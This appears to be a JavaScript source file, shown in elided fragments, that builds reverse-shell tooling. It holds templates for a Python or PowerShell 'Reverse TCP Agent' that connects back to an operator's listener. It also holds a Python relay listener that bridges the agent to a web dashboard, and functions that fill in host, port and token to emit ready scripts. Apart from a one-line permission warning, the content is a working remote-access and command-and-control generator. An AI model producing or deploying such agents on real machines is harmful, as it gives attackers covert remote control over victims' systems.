const PYTHON_AGENT = [
  '#!/usr/bin/env python3',
  '# Reverse TCP Agent - Connects back to YOUR listener.',
...
const PYTHON_LISTENER = [
  ...
  '# Accepts Agent (AUTH) + Web Dashboard (PULL), bridges them.',
  '# USE ONLY on systems you own or have EXPLICIT permission for.',
  'import socket, threading',
  'PORT=__PORT__',
  'TOKEN="__TOKEN__"',
  'relay={"agent":None,"web":None}',
  'lock=threading.Lock()',
  'def sendln(s,t):',
  '  try: s.sendall((t+"\\n").encode("utf-8","replace"))',
  '  except: pass',
  ...
  'def close_pair():',
  '  with lock: a,w=relay["agent"],relay["web"]; relay["agent"]=None; relay["web"]=None',
  '  for x in(a,w):',
  '    if x:',
  ...
  'def bridge(a,w):',
  '  sendln(w,"AGENT ON")',
  '  threading.Thread(target=pump,args=(a,w,"a2w"),daemon=True).start()',
  '  threading.Thread(target=pump,args=(w,a,"w2a"),daemon=True).start()',
  'def consider():',
  '  with lock: a,w=relay["agent"],relay["web"]',
  ...
  '  elif line=="PULL":',
  '    with lock:',
  '      if relay["web"]: sock.close(); return',
  '      relay["web"]=sock',
  '    consider()',
  '  else: sock.close()',
  'def main():',
...
function fill(template, host, port, token) {
  return template.replace('__HOST__', host).replace('__PORT__', String(port)).replace('__TOKEN__', token);
}

export function generateAgent({ language, host, port, token }) {
  const h = String(host || '').trim();
  if (!/^[a-zA-Z0-9.\-:\[\]]+$/.test(h)) throw new Error('host invalid');
  const p = safePort(port);
  const t = safeToken(token);
  const script = fill(language === 'python' ? PYTHON_AGENT : POWERSHELL_AGENT, h, p, t);
...
export function generateListener({ port, token }) {
  const p = safePort(port);
  const t = safeToken(token);
  const script = fill(PYTHON_LISTENER, '0.0.0.0', p, t);
